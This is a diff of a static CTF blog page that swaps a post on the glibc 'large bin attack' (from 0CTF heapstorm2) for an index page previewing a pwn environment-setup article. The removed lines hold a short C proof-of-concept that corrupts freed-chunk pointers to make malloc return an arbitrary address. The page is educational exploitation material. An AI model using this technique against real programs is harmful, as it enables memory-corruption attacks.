@@ -108,24 +108,20 @@
 
 
 
-  <meta name="description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
-<meta property="og:type" content="article">
-<meta property="og:title" content="large bin attack 学习记录">
-<meta property="og:url" content="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="PWN? PWN!">
+<meta property="og:url" content="https://charlieleex.github.io/page/4/index.html">
 <meta property="og:site_name" content="PWN? PWN!">
-<meta property="og:description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-08-15T02:01:05.939Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="large bin attack 学习记录">
-<meta name="twitter:description" content="这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦 然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下 这里给下dalao的博客 Largebin 学习 真的讲得不错 然后看到heapstorm2的解析，真">
+<meta name="twitter:title" content="PWN? PWN!">
 
 
 
 
 
 
-  <link rel="canonical" href="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/"/>
+  <link rel="canonical" href="https://charlieleex.github.io/page/4/"/>
 
 
 
@@ -135,7 +131,7 @@
   };
 </script>
 
-  <title>large bin attack 学习记录 | PWN? PWN!</title>
+  <title>PWN? PWN!</title>
   
 
 
@@ -182,7 +178,8 @@
     
   
 
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -263,9 +260,9 @@
           
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
 
@@ -280,7 +277,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/">
+    <link itemprop="mainEntityOfPage" href="https://charlieleex.github.io/2018/06/21/pwn从入门到放弃第一章——环境安装/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Charlie">
@@ -297,7 +294,11 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">large bin attack 学习记录
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/21/pwn从入门到放弃第一章——环境安装/" itemprop="url">
+                  pwn从入门到放弃第一章——环境安装
+                </a>
               
             
           </h1>
@@ -322,12 +323,24 @@
                 
               
 
-              <time title="Created: 2018-08-15 09:51:07 / Modified: 10:01:05" itemprop="dateCreated datePublished" datetime="2018-08-15T09:51:07+08:00">2018-08-15</time>
+              <time title="Created: 2018-06-21 17:27:33" itemprop="dateCreated datePublished" datetime="2018-06-21T17:27:33+08:00">2018-06-21</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-09-26 20:18:24" itemprop="dateModified" datetime="2018-09-26T20:18:24+08:00">2018-09-26</time>
               
             
           </span>
@@ -360,18 +373,23 @@
       
 
       
-        <p>这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦</p>
-<p>然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下</p>
-<p>这里给下dalao的博客</p>
-<p><a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Largebin 学习</a></p>
-<p>真的讲得不错</p>
-<p>然后看到heapstorm2的解析，真的惊为天人，非常优雅的攻击方法</p>
-<p>总结一下，大概就是unsorted bin 插入large bin list的时候，会触发一个任意地址写堆地址</p>
-<p>然后跳出unsorted bin 循环之后，还会有一个任意地址写堆地址</p>
-<p>然后可以伪造一个大小为0x50的chunk</p>
-<p>这个时候就相当于可以alloc到任意想要的地方</p>
-<p>攻击方法可以总结为下面的c语言代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //only for init</span><br><span class="line">    setbuf(stdin,0);</span><br><span class="line">    setbuf(stdout,0);</span><br><span class="line"></span><br><span class="line">    //map a fixed address memory</span><br><span class="line">    mmap((void*)0x13370000,0x1000,3,34,-1,0);</span><br><span class="line"></span><br><span class="line">    //malloc 2 large bin</span><br><span class="line">    long long* h1=malloc(0x418);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    long long* h2=malloc(0x428);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    </span><br><span class="line">    //make the small one into large bin list</span><br><span class="line">    free(h1);</span><br><span class="line">    malloc(0x500);</span><br><span class="line"></span><br><span class="line">    //make the bigger one into unsorted bin list</span><br><span class="line">    free(h2);</span><br><span class="line">    </span><br><span class="line">    //change the small one&apos;s bk and bk_nextsize ,the 0xdeadbeef only show that fd and fd_nextsize doesn&apos;t matter</span><br><span class="line">    </span><br><span class="line">    h1[0]=0xdeadbeef;</span><br><span class="line">    h1[1]=0x13370000-0x10+3;</span><br><span class="line">    h1[2]=0xdeadbeef;</span><br><span class="line">    h1[3]=0x13370018-0x20;</span><br><span class="line"></span><br><span class="line">    //change the unsorted bin&apos;s bk</span><br><span class="line">    h2[0]=0xdeadbeef;</span><br><span class="line">    h2[1]=0x13370000;</span><br><span class="line">    </span><br><span class="line">    //triger the bug and alloc where you want, but it need your luck</span><br><span class="line">    long long * h3=malloc(0x48);</span><br><span class="line">    printf(&quot;you are luck and get %p\n&quot;,h3);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
+          
+          做pwn 比较重要的就是一个好的环境，这里介绍一下入门的环境安装
+第一步下载kali vmware镜像，如果自身装了双系统kali的可以跳过此步骤，但是可能因为kali的版本不对而导致一些东西安装失败或者运行出错
+这里是下载地址
+百度云onedrive
+第二步下载完之后，解压镜像到一个文件夹
+然后导
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/06/21/pwn从入门到放弃第一章——环境安装/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -391,32 +409,12 @@
       
 
       
-      
+
       
 
       
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/07/29/pwn从入门到放弃第六章——简单ROP/" rel="next" title="pwn从入门到放弃第六章——简单ROP">
-                <i class="fa fa-chevron-left"></i> pwn从入门到放弃第六章——简单ROP
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/16/AFL-fuzz-初探/" rel="prev" title="AFL fuzz 初探">
-                AFL fuzz 初探 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
       
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -426,15 +424,18 @@
   </article>
 
 
-  </div>
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+  </nav>
+
 
 
           </div>
           
-
-  
-
-
 
         </div>
         
@@ -638,10 +639,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
-
-
 
   
 
@@ -698,6 +695,10 @@
   
 
   
+  
+    
+      
+    
   
 
   
